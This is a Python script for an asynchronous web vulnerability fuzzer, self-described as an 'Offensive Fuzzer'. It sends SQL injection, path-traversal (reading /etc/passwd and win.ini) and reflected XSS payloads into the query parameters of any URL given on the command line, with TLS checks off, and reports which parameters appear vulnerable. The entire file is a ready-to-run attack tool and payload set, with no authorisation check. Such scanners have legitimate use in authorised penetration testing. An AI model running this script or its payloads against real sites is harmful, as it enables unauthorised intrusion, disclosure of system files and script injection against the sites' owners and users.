import asyncio
import httpx
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

SQLI_PAYLOADS = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", "1' ORDER BY 1--+"]
LFI_PAYLOADS = ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini", "/etc/passwd"]
XSS_PAYLOADS = ["<script>alert(1337)</script>", "\"><script>alert(1337)</script>"]

SQLI_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "postgresql query failed",
    "sqlite3.operationalerror",
    "sql syntax"
]

async def fuzz_parameterized_url(client, base_url, reporter=None):
    parsed = urlparse(base_url)
    query_params = parse_qs(parsed.query)
    
    findings = []
    
    if not query_params:
        test_params = ["id", "search", "query", "user", "page", "cat", "file"]
        for param in test_params:
            test_query = {param: "test"}
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(test_query), parsed.fragment))
            try:
                resp = await client.get(test_url, timeout=4.0, follow_redirects=True)
                if resp.status_code < 500:
                    query_params = {param: ["test"]}
                    break
            except Exception:
                pass

    if not query_params:
        print("[-] No query parameters identified or found to fuzz.")
        return findings

    print(f"[*] Starting Offensive Vulnerability Fuzzing & Exploitation Simulation against: {base_url}")
    
    for param_name in query_params.keys():
        print(f"[*] Fuzzing parameter: '{param_name}'")
        
        # Test SQLi
        for payload in SQLI_PAYLOADS:
            fuzz_params = query_params.copy()
            fuzz_params[param_name] = [payload]
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(fuzz_params, doseq=True), parsed.fragment))
            
            try:
                resp = await client.get(test_url, timeout=4.0, follow_redirects=True)
                body_lower = resp.text.lower()
                for err in SQLI_ERRORS:
                    if err in body_lower:
                        desc = f"Potential SQL Injection (SQLi) detected in parameter '{param_name}' using payload: {payload}"
                        print(f"[!] {desc}")
                        findings.append({"type": "SQLi", "param": param_name, "payload": payload, "severity": "HIGH"})
                        if reporter:
                            reporter.add_finding(
                                module="Offensive Fuzzer",
                                severity="HIGH",
                                description=desc,
                                details={"url": test_url, "parameter": param_name, "payload": payload, "error_matched": err}
                            )
                        break
            except Exception:
                pass

        # Test LFI
        for payload in LFI_PAYLOADS:
            fuzz_params = query_params.copy()
            fuzz_params[param_name] = [payload]
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(fuzz_params, doseq=True), parsed.fragment))
            
            try:
                resp = await client.get(test_url, timeout=4.0, follow_redirects=True)
                if "root:x:0:0:" in resp.text or "[fonts]" in resp.text:
                    desc = f"Potential Path Traversal / LFI vulnerability confirmed in parameter '{param_name}' using payload: {payload}"
                    print(f"[!] {desc}")
                    findings.append({"type": "LFI", "param": param_name, "payload": payload, "severity": "CRITICAL"})
                    if reporter:
                        reporter.add_finding(
                            module="Offensive Fuzzer",
                            severity="CRITICAL",
                            description=desc,
                            details={"url": test_url, "parameter": param_name, "payload": payload}
                        )
            except Exception:
                pass

        # Test XSS
        for payload in XSS_PAYLOADS:
            fuzz_params = query_params.copy()
            fuzz_params[param_name] = [payload]
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(fuzz_params, doseq=True), parsed.fragment))
            
            try:
                resp = await client.get(test_url, timeout=4.0, follow_redirects=True)
                if payload in resp.text:
                    desc = f"Reflected Cross-Site Scripting (XSS) detected in parameter '{param_name}'"
                    print(f"[!] {desc}")
                    findings.append({"type": "XSS", "param": param_name, "payload": payload, "severity": "MEDIUM"})
                    if reporter:
                        reporter.add_finding(
                            module="Offensive Fuzzer",
                            severity="MEDIUM",
                            description=desc,
                            details={"url": test_url, "parameter": param_name, "payload": payload}
                        )
            except Exception:
                pass

    print("-" * 65)
    print(f"OFFENSIVE FUZZING SUMMARY")
    print("-" * 65)
    print(f"[*] Total Vulnerabilities / Anomalies Flagged: {len(findings)}")
    print("-" * 65)

    if reporter:
        reporter.add_section("Offensive Fuzzer Analysis", {
            "target": base_url,
            "findings_count": len(findings),
            "findings": findings
        })

    print("[*] Offensive vulnerability fuzzing completed.")

async def run_offensive_fuzz(target_url, reporter=None):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) OffensiveAuditor/2.0"}
    async with httpx.AsyncClient(headers=headers, verify=False, follow_redirects=True) as client:
        await fuzz_parameterized_url(client, target_url, reporter=reporter)

if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "http://demo.testfire.net/search.jsp?query=test"
    asyncio.run(run_offensive_fuzz(target))
